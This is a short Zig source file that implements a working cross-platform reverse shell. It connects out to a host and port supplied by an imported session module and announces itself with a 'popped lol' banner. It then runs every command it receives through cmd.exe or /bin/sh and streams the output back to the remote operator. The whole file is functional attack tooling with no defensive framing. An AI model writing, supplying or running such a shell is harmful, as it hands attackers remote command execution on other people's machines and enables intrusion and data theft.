const std = @import("std");
const builtin = @import("builtin");
const session = @import("session");

const fs = std.fs;
const net = std.net;
const os = std.os;
const process = std.process;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    // connect to tcp://host:port, if connection fails close the stream
    var stream = try net.tcpConnectToAddress(net.Address.parseIp4(session.host, session.port) catch unreachable);
    defer stream.close();

    // IOC
    _ = try stream.write("popped lol\n. ");

    // buffer to store cmd
    var buffer: [1024]u8 = undefined;

    while (true) {
        // read cmd to buffer
        const bytes_read = try stream.read(&buffer);
        if (bytes_read == 0) break;

        const command = std.mem.trim(u8, buffer[0..bytes_read], &std.ascii.whitespace);

        // if exit or quit, close shell
        if (std.mem.eql(u8, command, "exit") or std.mem.eql(u8, command, "quit")) {
            _ = try stream.write("dueces.\n");
            break;
        }

        // if windows, spawn cmd.exe as child and read stdout/err
        // if *nix, spawn /bin/sh as child as read stdout/err
        var child: std.process.Child = undefined;
        if (builtin.os.tag == .windows) {
            child = std.process.Child.init(&.{ "c:\\windows\\system32\\cmd.exe", "/c", command }, allocator);
        } else {
            child = std.process.Child.init(&.{ "/bin/sh", "-c", command }, allocator);
        }
        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;

        try child.spawn();

        const stdout = try child.stdout.?.reader().readAllAlloc(allocator, 10 * 1024 * 1024);
        const stderr = try child.stderr.?.reader().readAllAlloc(allocator, 10 * 1024 * 1024);
        defer allocator.free(stdout);
        defer allocator.free(stderr);

        _ = try child.wait();

        // write stdout/err to the tcp stream
        if (stdout.len > 0) {
            _ = try stream.write(stdout);
        }
        if (stderr.len > 0) {
            _ = try stream.write(stderr);
        }

        // prompt
        _ = try stream.write(". ");
    }
}
